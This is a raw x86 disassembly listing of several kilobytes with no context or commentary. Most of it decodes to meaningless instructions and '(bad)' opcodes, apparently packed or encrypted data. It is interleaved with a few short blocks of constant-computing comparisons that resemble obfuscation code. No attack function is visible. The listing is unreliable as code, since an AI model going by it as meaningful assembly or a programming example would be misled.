  41cfb5:	xchg   BYTE PTR [eax],cl
  41cfb7:	jae    0x41cfa4
  41cfb9:	mov    eax,0x7c2ef549
  41cfbe:	fwait
  41cfbf:	pop    edx
  41cfc0:	pop    ss
  41cfc1:	fmul   QWORD PTR [edx]
  41cfc3:	push   ebp
  41cfc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfc5:	mov    edx,esi
  41cfc7:	inc    esp
  41cfc8:	in     eax,0x35
  41cfca:	shl    DWORD PTR [esi+0x0],0xbf
  41cfce:	sar    BYTE PTR ds:0x1bad7166,1
  41cfd4:	cdq    
  41cfd5:	inc    edi
  41cfd6:	inc    esp
  41cfd7:	adc    bl,BYTE PTR [edx]
  41cfd9:	inc    ecx
  41cfda:	push   es
  41cfdb:	or     BYTE PTR [edx],al
  41cfdd:	or     edi,DWORD PTR ds:0x9f821c77
  41cfe3:	cmp    ch,ah
  41cfe5:	and    DWORD PTR [esi],edx
  41cfe7:	in     al,0x6f
  41cfe9:	add    eax,0x13f140f6
  41cfee:	iret   
  41cfef:	repnz cmc 
  41cff1:	ds das 
  41cff3:	mov    eax,0xbfe76e
  41cff8:	or     esp,DWORD PTR [ecx-0xe]
  41cffb:	adc    al,BYTE PTR [ecx]
  41cffd:	mov    eax,0xd763c500
  41d002:	jb     0x41d00a
  41d004:	and    al,0xf
  41d006:	out    dx,al
  41d007:	cmp    BYTE PTR [ecx-0x51b641c3],cl
  41d00d:	or     edx,edi
  41d00f:	pop    es
  41d010:	fist   DWORD PTR [ebx-0x17]
  41d013:	mov    eax,ds:0x9f5f7cd6
  41d018:	fisttp WORD PTR [ebx-0x6b18688e]
  41d01e:	rcr    edi,1
  41d020:	xchg   edi,eax
  41d021:	jge    0x41cfbe
  41d023:	test   DWORD PTR [esi],esp
  41d025:	shl    DWORD PTR [ebp-0x499c260b],cl
  41d02b:	push   ebx
  41d02c:	xor    eax,0x610793e9
  41d031:	mov    ds:0xdde40276,eax
  41d036:	test   al,0x25
  41d038:	sbb    al,0x78
  41d03a:	outs   dx,DWORD PTR ds:[esi]
  41d03b:	xlat   BYTE PTR ds:[ebx]
  41d03c:	jae    0x41d091
  41d03e:	adc    DWORD PTR [edx-0x54bcc269],esi
  41d044:	fisttp QWORD PTR [ebp-0x32]
  41d047:	jmp    0x6b30:0x885f44a8
  41d04e:	iret   
  41d04f:	jge    0x41d027
  41d051:	xchg   esp,eax
  41d052:	out    0xbe,eax
  41d054:	inc    ecx
  41d055:	pop    edx
  41d056:	jnp    0x41cfe7
  41d058:	out    dx,eax
  41d059:	es loopne 0x41cfeb
  41d05c:	inc    edx
  41d05d:	ret    
  41d05e:	or     BYTE PTR [edi-0x3b],dh
  41d061:	(bad)  
  41d062:	mov    DWORD PTR [ecx+0x4fa7dedf],esp
  41d068:	mov    ebp,0x9d5a7cc9
  41d06d:	in     al,dx
  41d06e:	add    ch,BYTE PTR [esi-0x30]
  41d071:	rcr    BYTE PTR [ebp-0x2f076a82],cl
  41d077:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d079:	rcr    DWORD PTR [eax-0x64],0x68
  41d07d:	dec    eax
  41d07e:	jne    0x41d09d
  41d080:	dec    esp
  41d081:	mov    esp,0x3a73e3e5
  41d086:	inc    edi
  41d087:	mov    ebp,cs
  41d089:	mov    bl,0xc0
  41d08b:	xor    dl,dl
  41d08d:	cs pop edx
  41d08f:	mov    esi,0xd7aff59f
  41d094:	fcom   DWORD PTR [esi+eax*1+0x4c]
  41d098:	sbb    DWORD PTR [ebx],esp
  41d09a:	dec    esi
  41d09b:	sti    
  41d09c:	push   0xffffffa6
  41d09e:	adc    ebp,DWORD PTR [edx]
  41d0a0:	push   ecx
  41d0a1:	sbb    BYTE PTR [ecx+0x34],0xa3
  41d0a5:	test   BYTE PTR [eax+0x4fd45504],dl
  41d0ab:	mov    ch,0x9
  41d0ad:	in     al,0x68
  41d0af:	jmp    0x41d087
  41d0b1:	ins    DWORD PTR es:[edi],dx
  41d0b2:	xchg   esp,eax
  41d0b3:	inc    ebp
  41d0b4:	and    dl,ah
  41d0b6:	out    0x34,eax
  41d0b8:	xchg   esi,eax
  41d0b9:	lods   eax,DWORD PTR ds:[esi]
  41d0ba:	std    
  41d0bb:	iret   
  41d0bc:	xchg   dl,bh
  41d0be:	(bad)  
  41d0bf:	fstp   DWORD PTR [edi-0x70]
  41d0c2:	rcr    DWORD PTR [edi-0x2ad0b400],cl
  41d0c8:	inc    ebx
  41d0c9:	mov    esi,DWORD PTR [edi+0x77]
  41d0cc:	mov    al,ds:0x8ac12ae3
  41d0d1:	dec    esp
  41d0d2:	and    al,0x38
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x4abc6585
  41d15f:	shr    dh,cl
  41d161:	mov    esi,0x18165d36
  41d166:	mov    esp,0xb9181812
  41d16b:	idiv   BYTE PTR [ecx-0x8]
  41d16e:	bound  edx,QWORD PTR [ecx+0xc32545c]
  41d174:	adc    DWORD PTR [ecx+0x4c],edx
  41d177:	pop    edx
  41d178:	das    
  41d179:	shl    ebp,0xcc
  41d17c:	adc    edi,DWORD PTR [esi]
  41d17e:	data16 xor al,bh
  41d181:	rcl    DWORD PTR [eax],cl
  41d183:	sar    DWORD PTR ds:0x68ad651,0x4f
  41d18a:	mov    ebx,ebp
  41d18c:	popf   
  41d18d:	iret   
  41d18e:	cwde   
  41d18f:	and    DWORD PTR [ecx+edi*1-0x24],edx
  41d193:	(bad)  
  41d195:	and    DWORD PTR [esi-0x62cd2017],0x87179b7c
  41d19f:	and    BYTE PTR [esi],dl
  41d1a1:	add    eax,0xca431607
  41d1a6:	mov    eax,0x73c17064
  41d1ab:	adc    ebx,DWORD PTR [esp+ecx*1]
  41d1ae:	cdq    
  41d1af:	aas    
  41d1b0:	cmp    al,0xd8
  41d1b2:	data16 add BYTE PTR [edx+eiz*1],bl
  41d1b6:	(bad)  
  41d1b7:	ss push ecx
  41d1b9:	push   esi
  41d1ba:	int3   
  41d1bb:	inc    ebx
  41d1bc:	sub    edi,esi
  41d1be:	xlat   BYTE PTR ds:[ebx]
  41d1bf:	mov    edx,0x1ea149a0
  41d1c4:	mov    dh,0x21
  41d1c6:	lock sub al,0xc0
  41d1c9:	or     al,0x28
  41d1cb:	xor    eax,0xd742d725
  41d1d0:	cs ror al,1
  41d1d3:	scas   eax,DWORD PTR es:[edi]
  41d1d4:	push   ebp
  41d1d5:	nop
  41d1d6:	int3   
  41d1d7:	xor    eax,0x51a939b2
  41d1dc:	jg     0x41d24b
  41d1de:	and    edx,esp
  41d1e0:	mov    ebx,0x1e923956
  41d1e5:	sbb    ah,BYTE PTR [edi]
  41d1e7:	popa   
  41d1e8:	test   dh,al
  41d1ea:	loope  0x41d21e
  41d1ec:	mov    ch,bl
  41d1ee:	lea    esi,[ebp+0x1b]
  41d1f1:	xchg   ecx,eax
  41d1f2:	add    DWORD PTR [ebx-0x60e7d494],ebx
  41d1f8:	xchg   edx,eax
  41d1f9:	inc    ebx
  41d1fa:	inc    DWORD PTR [edi+ecx*4-0x68]
  41d1fe:	ja     0x41d1f1
  41d200:	(bad)  
  41d201:	jp     0x41d18d
  41d203:	stc    
  41d204:	call   0xea7b:0xc479bf21
  41d20b:	xchg   edx,eax
  41d20c:	cdq    
  41d20d:	lds    ebp,FWORD PTR [edi*8+0x3876eeb6]
  41d214:	dec    edi
  41d215:	jg     0x41d1de
  41d217:	test   DWORD PTR [esp+ebp*1+0x29d78bee],eax
  41d21e:	jp     0x41d229
  41d220:	cmp    dh,ah
  41d222:	push   edi
  41d223:	je     0x41d225
  41d225:	or     al,0x5b
  41d227:	sbb    DWORD PTR [ecx],0x7c617f5
  41d22d:	push   0xef82770f
  41d232:	sbb    BYTE PTR [esi-0x54],0x27
  41d236:	inc    edx
  41d237:	aas    
  41d238:	xchg   esi,edi
  41d23a:	test   al,0xc3
  41d23c:	iret   
  41d23d:	shl    BYTE PTR [ecx],cl
  41d23f:	or     eax,0xddc50278
  41d244:	ret    
  41d245:	jb     0x41d253
  41d247:	loop   0x41d1f0
  41d249:	dec    eax
  41d24a:	lea    edx,[ebp-0x37]
  41d24d:	push   ebp
  41d24e:	test   BYTE PTR [edi-0x343682ac],cl
  41d254:	in     eax,dx
  41d255:	ja     0x41d203
  41d257:	mov    edx,0x24812c22
  41d25c:	or     al,0x3f
  41d25e:	mov    BYTE PTR [ebx],cl
  41d260:	pop    esp
  41d261:	inc    ebx
  41d262:	xor    cl,dh
  41d264:	clc    
  41d265:	xor    DWORD PTR [esp+ecx*8-0x4d],ecx
  41d269:	push   edi
  41d26a:	test   al,0x50
  41d26c:	xchg   esi,eax
  41d26d:	dec    eax
  41d26e:	or     dh,bl
  41d270:	cmp    BYTE PTR [ecx-0x16],cl
  41d273:	fwait
  41d274:	dec    ebx
  41d275:	pop    ss
  41d276:	inc    esp
  41d277:	lds    eax,FWORD PTR [ebx+0x31]
  41d27a:	mov    ebx,0xe2ebd3d9
  41d27f:	addr16 xchg esp,esi
  41d282:	jmp    0xf3fc:0x254894fe
  41d289:	call   0x8424:0xe230e600
  41d290:	sahf   
  41d291:	in     al,0x4e
  41d293:	(bad)  
  41d294:	mov    eax,0xbc291ffe
  41d299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d29a:	adc    BYTE PTR [ecx],bl
  41d29c:	xchg   edx,eax
  41d29d:	loope  0x41d247
  41d29f:	mov    al,ds:0x530a01d2
  41d2a4:	xor    BYTE PTR [ecx+0x2b],ch
  41d2a7:	enter  0x90eb,0xcb
  41d2ab:	clc    
  41d2ac:	int    0xd8
  41d2ae:	add    eax,0x135d5631
  41d2b3:	xchg   BYTE PTR [ecx-0x35],dh
  41d2b6:	pushf  
  41d2b7:	aas    
  41d2b8:	in     eax,dx
  41d2b9:	or     edx,eax
  41d2bb:	push   esp
  41d2bc:	pop    ss
  41d2bd:	popf   
  41d2be:	mov    al,0xcd
  41d2c0:	(bad)  
  41d2c1:	sub    al,0x6c
  41d2c3:	(bad)  
  41d2c4:	idiv   BYTE PTR [ebx+0x27107261]
  41d2ca:	push   esi
  41d2cb:	(bad)  [esi-0x3130e336]
  41d2d1:	sub    BYTE PTR [edx+0x5f355e5e],al
  41d2d7:	(bad)  
  41d2d8:	mov    ebp,0x38fc84ad
  41d2dd:	sahf   
  41d2de:	loopne 0x41d2cc
  41d2e0:	sahf   
  41d2e1:	ins    BYTE PTR es:[edi],dx
  41d2e2:	arpl   WORD PTR [edi+0x6c693df2],bx
  41d2e8:	ins    BYTE PTR es:[edi],dx
  41d2e9:	dec    BYTE PTR [eax-0x1af88556]
  41d2ef:	scas   al,BYTE PTR es:[edi]
  41d2f0:	scas   al,BYTE PTR es:[edi]
  41d2f1:	sbb    BYTE PTR [esi+0x30e69caf],ah
  41d2f7:	xchg   ebx,eax
  41d2f8:	inc    edi
  41d2f9:	fwait
  41d2fa:	icebp  
  41d2fb:	stc    
  41d2fc:	mov    esi,ebx
  41d2fe:	and    edx,DWORD PTR [eax-0x43820ba4]
  41d304:	mov    bh,0xc9
  41d306:	adc    al,0x77
  41d308:	pusha  
  41d309:	fidiv  DWORD PTR ds:0xbf805b0e
  41d30f:	lods   eax,DWORD PTR ds:[esi]
  41d310:	in     al,dx
  41d311:	mov    edi,DWORD PTR [esi-0x6806b738]
  41d317:	xlat   BYTE PTR ds:[ebx]
  41d318:	mov    bh,0xa1
  41d31a:	imul   ebx,DWORD PTR [esi-0x46726eb9],0x7d7a61ea
  41d324:	gs jecxz 0x41d30e
  41d327:	cmp    DWORD PTR [edi+0x43876bc2],ebp
  41d32d:	push   edx
  41d32e:	repnz pop esp
  41d330:	and    DWORD PTR [ebx+0x2131d35b],0xffffffaf
  41d337:	and    DWORD PTR ds:0x44f3aaa0,edx
  41d33d:	inc    edx
  41d33e:	xor    ebp,DWORD PTR [eax+ebp*4-0x22bcf5d8]
  41d345:	cld    
  41d346:	das    
  41d347:	iret   
  41d348:	xchg   esi,eax
  41d349:	shl    eax,0x52
  41d34c:	add    DWORD PTR [edi+esi*2+0x5b28105b],ecx
  41d353:	(bad)  
  41d354:	sbb    esp,eax
  41d356:	dec    esp
  41d357:	jg     0x41d390
  41d359:	test   dl,0x84
  41d35c:	data16 jns 0x41d3a0
  41d35f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d360:	push   eax
  41d361:	push   ecx
  41d362:	les    eax,FWORD PTR [eax-0x5f8225ef]
  41d368:	mov    al,0x10
  41d36a:	rol    DWORD PTR [ebx],0x68
  41d36d:	or     al,0x6d
  41d36f:	aaa    
  41d370:	mov    ecx,esi
  41d372:	fsub   DWORD PTR [ebx+0x3]
  41d375:	inc    edx
  41d376:	xchg   ecx,eax
  41d377:	inc    esp
  41d378:	ss inc eax
  41d37a:	or     DWORD PTR [ebx],ebp
  41d37c:	repnz ror DWORD PTR [esi-0x56],cl
  41d380:	pop    ecx
  41d381:	pop    es
  41d382:	std    
  41d383:	mov    esp,0x7595f5b2
  41d388:	dec    ecx
  41d389:	and    dh,ah
  41d38b:	xor    DWORD PTR [eax+0x1612bff6],ebp
  41d391:	scas   al,BYTE PTR es:[edi]
  41d392:	lods   al,BYTE PTR ds:[esi]
  41d393:	push   esp
  41d394:	push   es
  41d395:	push   es
  41d396:	cdq    
  41d397:	and    DWORD PTR [ebx],eax
  41d399:	add    ebx,edi
  41d39b:	jb     0x41d343
  41d39d:	inc    ebx
  41d39e:	test   DWORD PTR ds:0x49bc6ad9,ecx
  41d3a4:	(bad)  
  41d3a5:	dec    edi
  41d3a6:	sbb    esp,eax
  41d3a8:	nop
  41d3a9:	cli    
  41d3aa:	xchg   esi,eax
  41d3ab:	pop    ebp
  41d3ac:	dec    esi
  41d3ad:	jns    0x41d368
  41d3af:	hlt    
  41d3b0:	ret    
  41d3b1:	mov    ebx,0x582124eb
  41d3b6:	push   esp
  41d3b7:	sub    esi,DWORD PTR [edi]
  41d3b9:	or     BYTE PTR [edx],0xe7
  41d3bc:	add    BYTE PTR [esi-0x19789bac],bh
  41d3c2:	push   eax
  41d3c3:	adc    eax,0x64939b40
  41d3c8:	adc    DWORD PTR [ebx],0xffffffb6
  41d3cb:	pop    ds
  41d3cc:	lods   al,BYTE PTR ds:[esi]
  41d3cd:	je     0x41d3b0
  41d3cf:	dec    ebx
  41d3d0:	ja     0x41d3ef
  41d3d2:	cli    
  41d3d3:	(bad)  
  41d3d4:	retf   
  41d3d5:	inc    eax
  41d3d6:	int    0x88
  41d3d8:	es mov esi,0x9cbef670
  41d3de:	out    dx,al
  41d3df:	jle    0x41d3cf
  41d3e1:	jb     0x41d3eb
  41d3e3:	mov    edi,0x877391d4
  41d3e8:	lea    eax,[eax+eax*1+0x6f]
  41d3ec:	xor    BYTE PTR [edi-0x415ea677],bl
  41d3f2:	add    eax,0x32598b1f
  41d3f7:	mov    esp,0x857047bc
  41d3fc:	int    0x3a
  41d3fe:	(bad)  
  41d3ff:	pop    ecx
  41d400:	sub    DWORD PTR [ebx],0xffffffbc
  41d403:	inc    edx
  41d404:	inc    edi
  41d405:	popf   
  41d406:	sahf   
  41d407:	mov    ah,0xb3
  41d409:	out    dx,al
  41d40a:	pop    eax
  41d40b:	sub    BYTE PTR [esi-0x7c16915a],dh
  41d411:	sub    al,0x9e
  41d413:	add    al,0x22
  41d415:	sbb    cl,BYTE PTR [esi+0x5be6bf39]
  41d41b:	mov    ah,0x78
  41d41d:	lahf   
  41d41e:	and    DWORD PTR [edx+0xa],esp
  41d421:	or     al,0x75
  41d423:	cld    
  41d424:	test   eax,0xa1f8ce33
  41d429:	mov    ecx,0xee39b5c6
  41d42e:	out    dx,al
  41d42f:	adc    al,BYTE PTR [esi]
  41d431:	jne    0x41d421
  41d433:	xchg   esi,eax
  41d434:	dec    esp
  41d435:	pop    edi
  41d436:	mov    DWORD PTR ds:0x123d498a,esi
  41d43c:	push   eax
  41d43d:	push   edx
  41d43e:	mov    ebp,ebp
  41d440:	dec    esp
  41d441:	or     bh,ah
  41d443:	ins    BYTE PTR es:[edi],dx
  41d444:	dec    eax
  41d445:	arpl   WORD PTR [ecx],cx
  41d447:	dec    ebx
  41d448:	jge    0x41d3cc
  41d44a:	in     al,0xa7
  41d44c:	mov    ebp,0x72a73095
  41d451:	rcl    BYTE PTR [esi],1
  41d453:	imul   edx,ecx,0x64
  41d456:	mov    esi,0x4c891b79
  41d45b:	sbb    esp,DWORD PTR [ebx]
  41d45d:	ja     0x41d456
  41d45f:	outs   dx,BYTE PTR ds:[esi]
  41d460:	jge    0x41d43b
  41d462:	loopne 0x41d471
  41d464:	fidiv  DWORD PTR [esi+0x20d4df9b]
  41d46a:	mov    ch,BYTE PTR [edx-0x2d]
  41d46d:	xor    cl,BYTE PTR [ebp-0x34]
  41d470:	sbb    ah,BYTE PTR [eax+0xeb1af7b]
  41d476:	push   edx
  41d477:	mov    ah,0xe2
  41d479:	daa    
  41d47a:	repz repz mov bl,0x92
  41d47e:	inc    ebp
  41d47f:	add    al,0x65
  41d481:	pusha  
  41d482:	inc    esi
  41d483:	in     eax,dx
  41d484:	fadd   QWORD PTR [eax+esi*4]
  41d487:	dec    edx
  41d488:	pop    es
  41d489:	jbe    0x41d43f
  41d48b:	je     0x41d4a3
  41d48d:	xchg   esi,eax
  41d48e:	mov    dl,0xee
  41d490:	inc    esp
  41d491:	js     0x41d477
  41d493:	out    0xc,eax
  41d495:	shl    DWORD PTR [ebp-0x29],cl
  41d498:	mov    WORD PTR [edi-0x6d],fs
  41d49b:	jne    0x41d4fd
  41d49d:	push   ecx
  41d49e:	inc    esp
  41d49f:	mov    bh,bl
  41d4a1:	ja     0x41d4f5
  41d4a3:	push   ds
  41d4a4:	jmp    0x41d43a
  41d4a6:	fsub   QWORD PTR [edi-0xf654cff]
  41d4ac:	(bad)  
  41d4ad:	push   ebx
  41d4ae:	and    dh,ah
  41d4b0:	out    dx,al
  41d4b1:	mov    DWORD PTR [ebx],ebp
  41d4b3:	sbb    edx,DWORD PTR [edx+0x195fec42]
  41d4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4ba:	loope  0x41d4b2
  41d4bc:	nop
  41d4bd:	dec    ecx
  41d4be:	add    DWORD PTR ds:0x98c22180,0x20
  41d4c5:	call   0x81634c79
  41d4ca:	imul   edi,DWORD PTR [eax-0x71],0xffffff9e
  41d4ce:	fdivr  st,st(3)
  41d4d0:	jbe    0x41d496
  41d4d2:	xchg   ebp,eax
  41d4d3:	lahf   
  41d4d4:	test   ebp,edi
  41d4d6:	or     eax,0x3cd90f3b
  41d4db:	dec    esp
  41d4dc:	mov    dl,BYTE PTR [edi+eax*4-0x3c4e1640]
  41d4e3:	fistp  WORD PTR [eax]
  41d4e5:	js     0x41d51c
  41d4e7:	xchg   ebx,eax
  41d4e8:	enter  0x63a0,0x34
  41d4ec:	cld    
  41d4ed:	or     DWORD PTR [ecx+ebx*4+0x29],edi
  41d4f1:	push   edx
  41d4f2:	test   eax,0x5316c489
  41d4f7:	ror    DWORD PTR [edx-0xd],cl
  41d4fa:	scas   eax,DWORD PTR es:[edi]
  41d4fb:	(bad)  
  41d4fc:	fistp  QWORD PTR [ebp+0x13]
  41d4ff:	in     al,dx
  41d500:	inc    ecx
  41d501:	stos   DWORD PTR es:[edi],eax
  41d502:	lahf   
  41d503:	or     DWORD PTR [ecx+0x6a633945],eax
  41d509:	sti    
  41d50a:	push   ss
  41d50b:	mov    dl,0x68
  41d50d:	inc    ebp
  41d50e:	(bad)  
  41d50f:	out    0x95,eax
  41d511:	lock cli 
  41d513:	test   DWORD PTR [esi],esp
  41d515:	mov    ecx,DWORD PTR [edx+eiz*1+0x4e815f0]
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d583
  41d54b:	dec    edi
  41d54c:	mov    eax,ds:0x1655da70
  41d551:	sbb    BYTE PTR [edx+edx*1+0x63f1818],bh
  41d558:	sub    dh,BYTE PTR [eax]
  41d55a:	xchg   esp,eax
  41d55b:	push   esp
  41d55c:	mov    edi,0x1d1f0f61
  41d561:	or     DWORD PTR [ebx+edx*4-0xf683a10],0x119840b4
  41d56c:	pop    ecx
  41d56d:	push   edx
  41d56e:	rol    DWORD PTR [esi],1
  41d570:	push   ebx
  41d571:	pushf  
  41d572:	sub    al,0xc1
  41d574:	cli    
  41d575:	pushf  
  41d576:	js     0x41d523
  41d578:	stc    
  41d579:	xchg   BYTE PTR [ebx],dl
  41d57b:	aad    0x76
  41d57d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d57e:	push   0xf0d0e8b1
  41d583:	pop    eax
  41d584:	jbe    0x41d54b
  41d586:	mov    ds:0x2c9e2a38,eax
  41d58b:	pop    ds
  41d58c:	lock push ds
  41d58e:	sub    DWORD PTR [eax-0x330e98e0],ecx
  41d594:	lods   eax,DWORD PTR ds:[esi]
  41d595:	int3   
  41d596:	stc    
  41d597:	push   0xc0cea109
  41d59c:	and    al,0x86
  41d59e:	jge    0x41d588
  41d5a0:	jl     0x41d5fc
  41d5a2:	adc    eax,0xed648a4f
  41d5a7:	jne    0x41d594
  41d5a9:	fmul   DWORD PTR [ebp-0x1]
  41d5ac:	pop    edi
  41d5ad:	int3   
  41d5ae:	leave  
  41d5af:	or     eax,0x802d3332
  41d5b4:	pop    ds
  41d5b5:	mov    al,ds:0x6b25aebb
  41d5ba:	out    dx,al
  41d5bb:	aaa    
  41d5bc:	daa    
  41d5bd:	out    dx,al
  41d5be:	push   0xffffff91
  41d5c0:	jecxz  0x41d5e4
  41d5c2:	clc    
  41d5c3:	dec    ebp
  41d5c4:	sbb    BYTE PTR [ebx+0x63624fc1],ch
  41d5ca:	mov    dl,0xc9
  41d5cc:	fst    DWORD PTR [eax+0x1c]
  41d5cf:	pop    eax
  41d5d0:	sahf   
  41d5d1:	imul   ecx,DWORD PTR [ebx],0x10
  41d5d4:	loope  0x41d638
  41d5d6:	scas   eax,DWORD PTR es:[edi]
  41d5d7:	cmc    
  41d5d8:	(bad)  
  41d5d9:	and    DWORD PTR [eax-0x48],esi
  41d5dc:	rcr    DWORD PTR [edx+ebp*2-0x1f985b3a],cl
  41d5e3:	popa   
  41d5e4:	jp     0x41d612
  41d5e6:	popa   
  41d5e7:	(bad)  ds:0xf9aa3e6d
  41d5ed:	ret    
  41d5ee:	inc    ebx
  41d5ef:	mov    al,ds:0x179bff1e
  41d5f4:	mov    eax,fs:0xd953eaf5
  41d5fa:	and    DWORD PTR [edx],0x7e867b84
  41d600:	test   al,0x89
  41d602:	ins    DWORD PTR es:[edi],dx
  41d603:	inc    ebp
  41d604:	jns    0x41d5c3
  41d606:	icebp  
  41d607:	(bad)  
  41d608:	and    al,0xbe
  41d60a:	int3   
  41d60b:	ins    BYTE PTR es:[edi],dx
  41d60c:	rcr    BYTE PTR [ecx+0xa],0xa6
  41d610:	cmp    bh,dh
  41d612:	fwait
  41d613:	aad    0xcf
  41d615:	mov    esp,0x12957297
  41d61a:	mov    ebx,0xf0e589d7
  41d61f:	(bad)  
  41d620:	enter  0x3e0b,0xd6
  41d624:	aad    0x7d
  41d626:	stos   BYTE PTR es:[edi],al
  41d627:	call   0xdcd8:0x6fce5ea9
  41d62e:	jp     0x41d5e1
  41d630:	call   0x5c2e8ff3
  41d635:	sub    bl,al
  41d637:	nop
  41d638:	fistp  WORD PTR ds:0xae3febfb
  41d63e:	cdq    
  41d63f:	addr16 xchg edx,eax
  41d641:	out    dx,eax
  41d642:	jbe    0x41d663
  41d644:	dec    ecx
  41d645:	fdivr  DWORD PTR [ebx-0x56]
  41d648:	push   es
  41d649:	adc    DWORD PTR [esi+0x6],eax
  41d64c:	xor    DWORD PTR es:[edx-0x5e29f50e],esi
  41d653:	mov    ebx,0x8382884d
  41d658:	or     ecx,DWORD PTR [ebx-0x3abcf88a]
  41d65e:	or     DWORD PTR ds:0x70520f9e,esp
  41d664:	adc    BYTE PTR [ebp-0x7c],bl
  41d667:	mov    ah,0x6a
  41d669:	adc    al,0xcb
  41d66b:	inc    esi
  41d66c:	mov    edx,0x260972b6
  41d671:	scas   al,BYTE PTR es:[edi]
  41d672:	mov    gs,ebp
  41d674:	mov    ebp,0x96f3bc8f
  41d679:	lahf   
  41d67a:	popa   
  41d67b:	repz add cl,dh
  41d67e:	mov    bl,0x38
  41d680:	mov    eax,ebx
  41d682:	addr16 ret 0x3a4f
  41d686:	adc    bh,BYTE PTR [ecx]
  41d688:	out    dx,al
  41d689:	push   esp
  41d68a:	mov    esp,0x78661dc7
  41d68f:	retf   
  41d690:	inc    eax
  41d691:	jmp    FWORD PTR [edi-0x1fd1ba93]
  41d697:	lods   al,BYTE PTR ds:[esi]
  41d698:	pop    es
  41d699:	pusha  
  41d69a:	push   esp
  41d69b:	scas   al,BYTE PTR es:[edi]
  41d69c:	pop    ss
  41d69d:	push   edx
  41d69e:	xlat   BYTE PTR ds:[ebx]
  41d69f:	je     0x41d682
  41d6a1:	lods   eax,DWORD PTR ds:[esi]
  41d6a2:	push   esi
  41d6a3:	dec    esp
  41d6a4:	jp     0x41d702
  41d6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6a7:	(bad)  
  41d6a8:	daa    
  41d6a9:	lods   eax,DWORD PTR ds:[esi]
  41d6aa:	retf   0xe270
  41d6ad:	adc    eax,0x19049c7a
  41d6b2:	xchg   ebp,eax
  41d6b3:	mov    dh,0x73
  41d6b5:	in     al,dx
  41d6b6:	mov    ch,BYTE PTR [ebp+0x5a4e8e22]
  41d6bc:	sub    eax,0xa0393a8d
  41d6c1:	xor    ah,ah
  41d6c3:	pushf  
  41d6c4:	push   ebx
  41d6c5:	nop
  41d6c6:	xor    al,0x65
  41d6c8:	pop    ebx
  41d6c9:	shl    DWORD PTR [eax-0xd0b86c9],1
  41d6cf:	lahf   
  41d6d0:	rcr    ah,1
  41d6d2:	mov    bl,0x6e
  41d6d4:	ins    BYTE PTR es:[edi],dx
  41d6d5:	(bad)  
  41d6d6:	push   es
  41d6d7:	cli    
  41d6d8:	nop
  41d6d9:	xor    DWORD PTR [ecx+0x14819fc5],eax
  41d6df:	stos   BYTE PTR es:[edi],al
  41d6e0:	add    DWORD PTR [ebp-0xf],esp
  41d6e3:	int3   
  41d6e4:	rol    bl,0x75
  41d6e7:	ins    BYTE PTR es:[edi],dx
  41d6e8:	pop    ds
  41d6e9:	int    0x63
  41d6eb:	add    al,0xfa
  41d6ed:	xor    BYTE PTR [ecx],ah
  41d6ef:	mov    bh,0x29
  41d6f1:	or     esi,DWORD PTR [ebp-0x80]
  41d6f4:	repz jo 0x41d75f
  41d6f7:	int3   
  41d6f8:	fdivr  QWORD PTR [ebp-0x979c0f9]
  41d6fe:	lods   al,BYTE PTR ds:[esi]
  41d6ff:	dec    ebx
  41d700:	test   al,0x3a
  41d702:	mov    al,0x3c
  41d704:	ret    
  41d705:	lds    eax,FWORD PTR [ecx-0x63892094]
  41d70b:	jecxz  0x41d6d2
  41d70d:	xor    al,0x3b
  41d70f:	adc    al,0x76
  41d711:	dec    ebx
  41d712:	pop    ss
  41d713:	add    al,0x2c
  41d715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d716:	call   0xf988:0xcb86de43
  41d71d:	sbb    BYTE PTR [esi+0x15],cl
  41d720:	in     al,0x36
  41d722:	int    0xf3
  41d724:	scas   al,BYTE PTR es:[edi]
  41d725:	dec    eax
  41d726:	add    ebp,DWORD PTR [edx+0xebbc330]
  41d72c:	pop    esp
